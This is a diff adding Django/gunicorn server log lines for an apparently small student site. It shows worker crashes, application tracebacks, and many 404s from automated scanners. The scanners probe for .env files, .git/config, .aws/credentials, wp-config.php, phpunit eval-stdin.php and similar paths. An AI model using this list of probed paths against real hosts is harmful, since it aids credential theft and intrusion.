@@ -673,3 +673,2192 @@ Not Found: /media/스크린샷 2023-11-14 오전 10.0
 Not Found: /media/스크린샷 2023-11-14 오전 10.00.40.png
 Not Found: /installer.php
 Not Found: /.git/config
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2018/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //media/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: /aaa9
+Not Found: /aab8
+Not Found: /media/스크린샷 2023-11-14 오전 10.00.40.png
+Not Found: /media/스크린샷 2023-11-14 오전 10.00.40.png
+/home/ubuntu/projects/mysite/scoopadive/user_profile/views.py:29: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'main.models.Log'> QuerySet.
+  paginatorLog = Paginator(loglist, 5)
+/home/ubuntu/projects/mysite/scoopadive/user_profile/views.py:30: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'board.models.Post'> QuerySet.
+  paginatorPost = Paginator(postlist, 5)
+[2024-01-31 12:46:54 +0900] [230998] [CRITICAL] WORKER TIMEOUT (pid:234218)
+[2024-01-31 03:46:54 +0000] [234218] [INFO] Worker exiting (pid: 234218)
+BASE_DIR: /home/ubuntu/projects/mysite/scoopadive
+STATIC_ROOT: /home/ubuntu/projects/mysite/scoopadive/main/static
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+[2024-01-31 12:46:55 +0900] [230998] [ERROR] Worker (pid:234218) was sent SIGKILL! Perhaps out of memory?
+[2024-01-31 12:46:56 +0900] [237028] [INFO] Booting worker with pid: 237028
+Not Found: /wp-login.php
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2018/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //media/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+[2024-01-31 13:06:50 +0900] [238462] [INFO] Starting gunicorn 21.2.0
+[2024-01-31 13:06:50 +0900] [238462] [INFO] Listening at: unix:/tmp/gunicorn.sock (238462)
+[2024-01-31 13:06:50 +0900] [238462] [INFO] Using worker: sync
+[2024-01-31 13:06:50 +0900] [238466] [INFO] Booting worker with pid: 238466
+Not Found: /wp-includes/wlwmanifest.xml
+Not Found: /wp-includes/wlwmanifest.xml
+Not Found: /administrator/index.php
+Not Found: /administrator/index.php
+Not Found: /view-source:
+Not Found: /view-source:
+Not Found: /misc/ajax.js
+Not Found: /misc/ajax.js
+Not Found: /robots.txt
+Not Found: /_ignition/execute-solution
+/home/ubuntu/projects/mysite/scoopadive/user_profile/views.py:29: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'main.models.Log'> QuerySet.
+  paginatorLog = Paginator(loglist, 5)
+/home/ubuntu/projects/mysite/scoopadive/user_profile/views.py:30: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'board.models.Post'> QuerySet.
+  paginatorPost = Paginator(postlist, 5)
+Not Found: /robots.txt
+Not Found: /accounts/login/
+Not Found: /robots.txt
+Not Found: /wp-includes/wlwmanifest.xml
+Not Found: /administrator/index.php
+Not Found: /view-source:
+Not Found: /misc/ajax.js
+Not Found: /accounts/login/
+Not Found: /accounts/login/
+Not Found: /robots.txt
+Internal Server Error: /profile/maria3037/modify_profile/
+Traceback (most recent call last):
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/db/models/fields/__init__.py", line 2112, in get_prep_value
+    return int(value)
+ValueError: invalid literal for int() with base 10: '오지모지'
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/core/handlers/base.py", line 197, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/home/ubuntu/projects/mysite/scoopadive/user_profile/views.py", line 91, in modify_profile
+    profile.save()
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/db/models/base.py", line 822, in save
+    self.save_base(
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/db/models/base.py", line 909, in save_base
+    updated = self._save_table(
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/db/models/base.py", line 1036, in _save_table
+    updated = self._do_update(
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/db/models/base.py", line 1101, in _do_update
+    return filtered._update(values) > 0
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/db/models/query.py", line 1276, in _update
+    return query.get_compiler(self.db).execute_sql(CURSOR)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/db/models/sql/compiler.py", line 1990, in execute_sql
+    cursor = super().execute_sql(result_type)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/db/models/sql/compiler.py", line 1549, in execute_sql
+    sql, params = self.as_sql()
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/db/models/sql/compiler.py", line 1953, in as_sql
+    val = field.get_db_prep_save(val, connection=self.connection)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/db/models/fields/__init__.py", line 1019, in get_db_prep_save
+    return self.get_db_prep_value(value, connection=connection, prepared=False)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/db/models/fields/__init__.py", line 2119, in get_db_prep_value
+    value = super().get_db_prep_value(value, connection, prepared)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/db/models/fields/__init__.py", line 1012, in get_db_prep_value
+    value = self.get_prep_value(value)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/db/models/fields/__init__.py", line 2114, in get_prep_value
+    raise e.__class__(
+ValueError: Field 'studentID' expected a number but got '오지모지'.
+[2024-01-31 15:04:26 +0900] [238462] [CRITICAL] WORKER TIMEOUT (pid:238466)
+[2024-01-31 06:04:27 +0000] [238466] [INFO] Worker exiting (pid: 238466)
+BASE_DIR: /home/ubuntu/projects/mysite/scoopadive
+STATIC_ROOT: /home/ubuntu/projects/mysite/scoopadive/main/static
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+[2024-01-31 15:04:28 +0900] [238462] [ERROR] Worker (pid:238466) was sent SIGKILL! Perhaps out of memory?
+[2024-01-31 15:04:28 +0900] [243485] [INFO] Booting worker with pid: 243485
+Not Found: /.env
+[2024-01-31 15:07:50 +0900] [238462] [INFO] Handling signal: hup
+[2024-01-31 15:07:50 +0900] [238462] [INFO] Hang up: Master
+[2024-01-31 15:07:51 +0900] [238462] [ERROR] Worker (pid:243485) was sent SIGHUP!
+[2024-01-31 15:07:51 +0900] [243629] [INFO] Booting worker with pid: 243629
+Not Found: /c/
+[31/Jan/2024 06:21:50] "GET /c/ HTTP/1.1" 404 5196
+Not Found: /webui/
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /geoserver/web/
+Not Found: /.git/config
+[31/Jan/2024 07:50:34] code 400, message Bad request version ('À\x14À')
+[31/Jan/2024 07:50:34] You're accessing the development server over HTTPS, but it only supports HTTP.
+[31/Jan/2024 07:50:35] code 400, message Bad request version ('À\x14À')
+[31/Jan/2024 07:50:35] You're accessing the development server over HTTPS, but it only supports HTTP.
+Not Found: /.git/config
+[31/Jan/2024 07:50:35] "GET / HTTP/1.1" 200 3786
+[31/Jan/2024 07:50:36] code 400, message Bad request version ('À\x14À')
+[31/Jan/2024 07:50:36] You're accessing the development server over HTTPS, but it only supports HTTP.
+[31/Jan/2024 08:17:54] "GET / HTTP/1.1" 200 3786
+[31/Jan/2024 08:17:54,743] - Broken pipe from ('43.129.39.141', 43634)
+[31/Jan/2024 08:17:59] "GET / HTTP/1.1" 200 3786
+[31/Jan/2024 08:18:01] "GET / HTTP/1.1" 200 3786
+[31/Jan/2024 08:18:03] "GET /static/bootstrap.min.js HTTP/1.1" 200 60577
+Not Found: /favicon.ico
+[31/Jan/2024 08:18:09] "GET /favicon.ico HTTP/1.1" 404 5223
+Not Found: /favicon.ico
+[31/Jan/2024 08:18:09] "GET /favicon.ico HTTP/1.1" 404 5223
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2020/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2020/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: /Public/home/js/check.js
+Not Found: /Autodiscover/Autodiscover.xml
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /accounts/login/
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /.env
+Internal Server Error: /common/signup/
+Traceback (most recent call last):
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/core/handlers/base.py", line 197, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/home/ubuntu/projects/mysite/scoopadive/common/views.py", line 30, in signup
+    user = User.objects.create_user(username=username, password=password1, email=email)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/contrib/auth/models.py", line 161, in create_user
+    return self._create_user(username, email, password, **extra_fields)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/contrib/auth/models.py", line 144, in _create_user
+    raise ValueError("The given username must be set")
+ValueError: The given username must be set
+Not Found: /wp-login.php
+Not Found: /console/
+Not Found: /_ignition/execute-solution
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /.git/config
+Not Found: /actuator/gateway/routes
+Not Found: /.env
+[31/Jan/2024 12:52:27] "GET /.env HTTP/1.1" 404 5202
+Not Found: /geoserver
+Not Found: /autodiscover/autodiscover.json
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2018/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //media/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: /.env
+Not Found: /.env
+Not Found: /webfig/
+Not Found: /webfig/
+[31/Jan/2024 18:32:20] "GET / HTTP/1.1" 200 3786
+Not Found: /Core/Skin/Login.aspx
+[31/Jan/2024 19:10:09] code 400, message Bad request version ("ºÅ©þX]Ö\x94Ó7u\x91\x94û9yu5\x13´!\x05ÿg8ì\x99\x9e\x04¦!j\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+[31/Jan/2024 19:10:09] You're accessing the development server over HTTPS, but it only supports HTTP.
+[31/Jan/2024 19:10:29] "GET / HTTP/1.1" 200 3786
+[31/Jan/2024 19:10:32] "GET / HTTP/1.1" 200 3786
+[31/Jan/2024 19:10:35] code 400, message Bad request version ("ÖpF\x93*ÕBQ+\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+[31/Jan/2024 19:10:35] You're accessing the development server over HTTPS, but it only supports HTTP.
+Not Found: /favicon.ico
+[31/Jan/2024 19:10:52] "GET /favicon.ico HTTP/1.1" 404 5227
+Not Found: /favicon.ico
+[31/Jan/2024 19:10:55] "GET /favicon.ico HTTP/1.1" 404 5227
+[31/Jan/2024 19:10:58,903] - Broken pipe from ('164.52.36.218', 51000)
+Not Found: /.env
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2020/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /robots.txt
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2020/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /Core/Skin/Login.aspx
+Not Found: /.env
+Not Found: /core/.env
+Not Found: /web/.env
+Not Found: /app/.env
+Not Found: /laravel/.env
+Not Found: /crm/.env
+Not Found: /backend/.env
+Not Found: /local/.env
+Not Found: /application/.env
+Not Found: /prod/.env
+Not Found: /api/.env
+Not Found: /blog/.env
+Not Found: /.env.bak
+Not Found: /vendor/laravel/.env
+Not Found: /vendor/.env
+Not Found: /public/.env
+Not Found: /apps/.env
+Not Found: /app/config/.env
+Not Found: /portal/.env
+Not Found: /config/.env
+Not Found: /core/app/.env
+Not Found: /.env.dev
+Not Found: /.env.prod
+Not Found: /config.php
+Not Found: /bitbucket-pipelines.yml
+Not Found: /.gitlab-ci.yml
+Not Found: /config/settings.yml
+Not Found: /config/environments/development.rb
+Not Found: /config/environments/production.rb
+Not Found: /config/environments/staging.rb
+Not Found: /wp-content/w3tc-config/master-preview.php
+Not Found: /wp-content/w3tc-config/master.php
+Not Found: /docker-compose.yml
+Not Found: /.env.production
+Not Found: /.env.save
+Not Found: /shared/.env
+Not Found: /system/.env
+Not Found: /.aws/credentials
+Not Found: /phpinfo
+Not Found: /_profiler/phpinfo
+Not Found: /phpinfo.php
+Not Found: /info.php
+Not Found: /wp-config.php.orig
+Not Found: /wp-config.php
+Not Found: /index.php
+Not Found: /temp.php
+Not Found: /config/queue.php
+Not Found: /config/services.php
+Not Found: /config/filesystems.php
+Forbidden (Referer checking failed - no Referer.): /
+[31/Jan/2024 21:23:20] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
+[31/Jan/2024 21:23:20] "    c                           " 400 -
+[31/Jan/2024 21:29:50] "GET / HTTP/1.1" 200 3786
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2020/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+[2024-02-01 07:05:37 +0900] [238462] [CRITICAL] WORKER TIMEOUT (pid:243629)
+[2024-02-01 07:05:38 +0900] [238462] [ERROR] Worker (pid:243629) was sent SIGKILL! Perhaps out of memory?
+[2024-02-01 07:05:38 +0900] [286202] [INFO] Booting worker with pid: 286202
+[2024-02-01 07:06:21 +0900] [238462] [CRITICAL] WORKER TIMEOUT (pid:286202)
+[2024-01-31 22:06:22 +0000] [286202] [INFO] Worker exiting (pid: 286202)
+BASE_DIR: /home/ubuntu/projects/mysite/scoopadive
+STATIC_ROOT: /home/ubuntu/projects/mysite/scoopadive/main/static
+Is not AnonymousUser!
+profile.is_ststMember: True
+[2024-02-01 07:06:22 +0900] [238462] [ERROR] Worker (pid:286202) was sent SIGKILL! Perhaps out of memory?
+[2024-02-01 07:06:22 +0900] [286226] [INFO] Booting worker with pid: 286226
+Not Found: /robots.txt
+Not Found: //wp-includes/ID3/license.txt
+Not Found: //feed/
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //2020/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //2021/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+[31/Jan/2024 23:34:38] code 400, message Bad request syntax ('help')
+[31/Jan/2024 23:34:38] "help" 400 -
+[01/Feb/2024 00:10:55,543] - Broken pipe from ('199.45.154.67', 56626)
+[01/Feb/2024 00:10:58] "GET / HTTP/1.1" 200 3786
+[01/Feb/2024 00:10:58,823] - Broken pipe from ('199.45.154.67', 56650)
+[01/Feb/2024 00:11:01] "GET / HTTP/1.1" 200 3786
+[01/Feb/2024 00:11:02] code 505, message Invalid HTTP version (2.0)
+[01/Feb/2024 00:11:02] "PRI * HTTP/2.0" 505 -
+Not Found: /favicon.ico
+[01/Feb/2024 00:11:02] "GET /favicon.ico HTTP/1.1" 404 5223
+Not Found: /Core/Skin/Login.aspx
+[01/Feb/2024 01:16:04] "GET / HTTP/1.1" 200 3786
+Not Found: /epa/scripts/win/nsepa_setup.exe
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /Temporary_Listen_Addresses
+Not Found: /ews/exchanges/
+Not Found: /ews/exchange /
+Not Found: /ews/exchange/
+Not Found: /ews/ /
+Not Found: /ews/ews/
+Not Found: /ews/autodiscovers/
+Not Found: /autodiscover/autodiscovers/
+Not Found: /autodiscover/autodiscover /
+Not Found: /autodiscover/autodiscoverrs/
+Not Found: /autodiscove/
+Not Found: /Autodiscover/Autodiscover.xml
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /Core/Skin/Login.aspx
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /wp-includes/wlwmanifest.xml
+Not Found: /administrator/index.php
+Not Found: /view-source:
+Not Found: /misc/ajax.js
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2018/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //media/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: /solr/admin/info/system
+Not Found: /.env
+Not Found: /Public/home/js/check.js
+Invalid HTTP_HOST header: 'example.com:443'. You may need to add 'example.com' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'example.com:443'. You may need to add 'example.com' to ALLOWED_HOSTS.
+Bad Request: /example.com:443
+[01/Feb/2024 03:32:49] "CONNECT example.com:443 HTTP/1.1" 400 63144
+[01/Feb/2024 03:32:54] code 400, message Bad request syntax ('\x05\x01\x00')
+[01/Feb/2024 03:32:54] " " 400 -
+[01/Feb/2024 03:33:00] code 400, message Bad request version ('À\x13À')
+[01/Feb/2024 03:33:00] You're accessing the development server over HTTPS, but it only supports HTTP.
+Not Found: /.env
+[01/Feb/2024 04:00:01] code 400, message Bad request syntax ('\x04\x01\x01»]¸Ø"\x00')
+[01/Feb/2024 04:00:01] "»]¸Ø" " 400 -
+Not Found: /console/
+Not Found: /.env
+[01/Feb/2024 04:45:48] code 400, message Bad request version ('\x8d/\x01Ím\x84|P¶½íòíy\x9dïôå¶ç')
+[01/Feb/2024 04:45:48] You're accessing the development server over HTTPS, but it only supports HTTP.
+[01/Feb/2024 04:45:49] code 400, message Bad request version ('À(À$À\x14À')
+[01/Feb/2024 04:45:49] You're accessing the development server over HTTPS, but it only supports HTTP.
+Not Found: /3ds.php
+Not Found: /3ds.php
+Not Found: /3ds1633693954432212
+Not Found: /3ds1633693954432212
+Not Found: /merchant/code
+Not Found: /merchant/code
+Not Found: /merchant/z/payment/
+Not Found: /merchant/z/payment/
+Not Found: /actuator/gateway/routes
+Not Found: /_profiler/phpinfo
+Not Found: /phpinfo.php
+Not Found: /phpinfo
+Not Found: /aws.yml
+Not Found: /.env.bak
+Not Found: /info.php
+Not Found: /.aws/credentials
+Not Found: /config/aws.yml
+Not Found: /config.js
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /Core/Skin/Login.aspx
+[01/Feb/2024 05:37:35] "GET / HTTP/1.1" 200 3786
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2020/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: /robots.txt
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
